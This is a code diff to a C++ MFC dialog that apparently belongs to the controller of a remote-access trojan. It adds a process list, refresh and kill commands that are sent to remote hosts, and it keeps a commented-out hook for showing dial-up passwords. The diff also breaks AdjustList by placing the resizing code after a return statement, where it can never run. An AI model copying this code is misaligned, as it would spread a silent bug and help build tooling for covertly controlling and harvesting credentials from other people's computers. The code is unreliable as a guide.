@@ -37,6 +37,9 @@ BEGIN_MESSAGE_MAP(CSystemDlg, CDialog)
 	ON_WM_SIZE()
 	ON_WM_CLOSE()
 	ON_NOTIFY(TCN_SELCHANGE, IDC_TAB, &CSystemDlg::OnTcnSelchangeTab)
+	ON_COMMAND(IDM_KILLPROCESS, &CSystemDlg::OnKillprocess)
+	ON_COMMAND(IDM_REFRESHPSLIST, &CSystemDlg::OnRefreshpslist)
+	ON_NOTIFY(NM_RCLICK, IDC_LIST_PROCESS, &CSystemDlg::OnNMRClickListProcess)
 END_MESSAGE_MAP()
 
 
@@ -44,16 +47,24 @@ END_MESSAGE_MAP()
 
 void CSystemDlg::AdjustList(void)
 {
-	RECT	rectClient;
-	RECT	rectList;
-	GetClientRect(&rectClient);
-	rectList.left = 0;
-	rectList.top = 29;
-	rectList.right = rectClient.right;
-	rectList.bottom = rectClient.bottom;
+	if (m_list_process.m_hWnd == NULL)
+	{
+		return;
+	}
+	if (m_list_windows.m_hWnd == NULL)
+	{
+		return;
+		RECT	rectClient;
+		RECT	rectList;
+		GetClientRect(&rectClient);
+		rectList.left = 0;
+		rectList.top = 29;
+		rectList.right = rectClient.right;
+		rectList.bottom = rectClient.bottom;
 
-	m_list_process.MoveWindow(&rectList);
-	m_list_windows.MoveWindow(&rectList);
+		m_list_process.MoveWindow(&rectList);
+		m_list_windows.MoveWindow(&rectList);
+	}
 }
 
 
@@ -184,3 +195,97 @@ void CSystemDlg::ShowProcessList(void)
 	lvc.cchTextMax = str.GetLength();
 	m_list_process.SetColumn(2, &lvc); //在列表中显示有多少个进程
 }
+
+
+void CSystemDlg::OnKillprocess()
+{
+	// TODO: 在此添加命令处理程序代码
+	CListCtrl	*pListCtrl = NULL;
+	if (m_list_process.IsWindowVisible())
+		pListCtrl = &m_list_process;
+	else if (m_list_windows.IsWindowVisible())
+		pListCtrl = &m_list_windows;
+	else
+		return;
+
+	// TODO: Add your command handler code here
+	//非配缓冲区
+	LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1 + (pListCtrl->GetSelectedCount() * 4));
+	//加入结束进程的数据头
+	lpBuffer[0] = COMMAND_KILLPROCESS;
+	//显示警告信息
+	char *lpTips = "警告: 终止进程会导致不希望发生的结果，\n"
+		"包括数据丢失和系统不稳定。在被终止前，\n"
+		"进程将没有机会保存其状态和数据。";
+	CString str;
+	if (pListCtrl->GetSelectedCount() > 1)
+	{
+		str.Format("%s确实\n想终止这%d项进程吗?", lpTips, pListCtrl->GetSelectedCount());
+	}
+	else
+	{
+		str.Format("%s确实\n想终止该项进程吗?", lpTips);
+	}
+	if (::MessageBox(m_hWnd, str, "进程结束警告", MB_YESNO | MB_ICONQUESTION) == IDNO)
+		return;
+
+	DWORD	dwOffset = 1;
+	POSITION pos = pListCtrl->GetFirstSelectedItemPosition(); //iterator for the CListCtrl
+	//得到要结束哪个进程
+	while (pos) //so long as we have a valid POSITION, we keep iterating
+	{
+		int	nItem = pListCtrl->GetNextSelectedItem(pos);
+		DWORD dwProcessID = pListCtrl->GetItemData(nItem);
+		memcpy(lpBuffer + dwOffset, &dwProcessID, sizeof(DWORD));
+		dwOffset += sizeof(DWORD);
+	}
+	//发送数据到服务端到服务端查找COMMAND_KILLPROCESS这个数据头
+	m_iocpServer->Send(m_pContext, lpBuffer, LocalSize(lpBuffer));
+	LocalFree(lpBuffer);
+}
+
+
+void CSystemDlg::OnRefreshpslist()
+{
+	// TODO: 在此添加命令处理程序代码
+	if (m_list_process.IsWindowVisible())
+		GetProcessList();
+	//if (m_list_windows.IsWindowVisible())
+		//GetWindowsList();
+}
+
+
+void CSystemDlg::OnNMRClickListProcess(NMHDR *pNMHDR, LRESULT *pResult)
+{
+	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
+	// TODO: 在此添加控件通知处理程序代码
+	CMenu	popup;
+	popup.LoadMenu(IDR_PSLIST);
+	CMenu*	pM = popup.GetSubMenu(0);
+	CPoint	p;
+	GetCursorPos(&p);
+
+	pM->TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this);
+	*pResult = 0;
+}
+
+
+void CSystemDlg::OnReceiveComplete(void)
+{
+	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
+	{
+	case TOKEN_PSLIST:
+		ShowProcessList();
+		break;
+		//case TOKEN_WSLIST:
+			//ShowWindowsList();
+			//break;
+		//case TOKEN_DIALUPASS:
+			//ShowDialupassList();
+			//break;
+	default:
+		// 传输发生异常数据
+		break;
+	}
+}
+
